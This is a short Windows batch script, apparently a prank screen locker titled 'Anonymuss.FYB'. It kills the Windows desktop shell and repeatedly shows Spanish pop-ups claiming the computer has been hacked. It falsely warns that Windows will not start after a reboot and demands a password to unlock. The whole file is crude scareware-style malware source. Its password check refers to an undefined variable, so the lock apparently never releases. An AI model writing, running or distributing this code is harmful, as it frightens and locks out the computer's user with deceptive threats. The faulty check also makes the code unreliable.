color 0A
@echo off
title Anonymuss.FYB
taskkill /f /im explorer.exe
:bucle
cls
msg * Lee con atención,  No reinicie el computador
msg * Este mensaje solo lo pueden leer a los que le gusta el p**e (contraseña)
msg * Haz sido hackeado
msg * ELPEPE
echo 
echo ========================================================================
echo Si usted cierra esta ventana,  no podrá colocar la contraseña.
echo Si apaga/reinicia el computador, el "Windows" no iniciará correctamente
echo ========================================================================
echo 
set /p pass=Pon la contraseña para desbloquear el computador:
if Y%passY%==contraseña (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Felicidades!
start explorer.exe
pause
exit
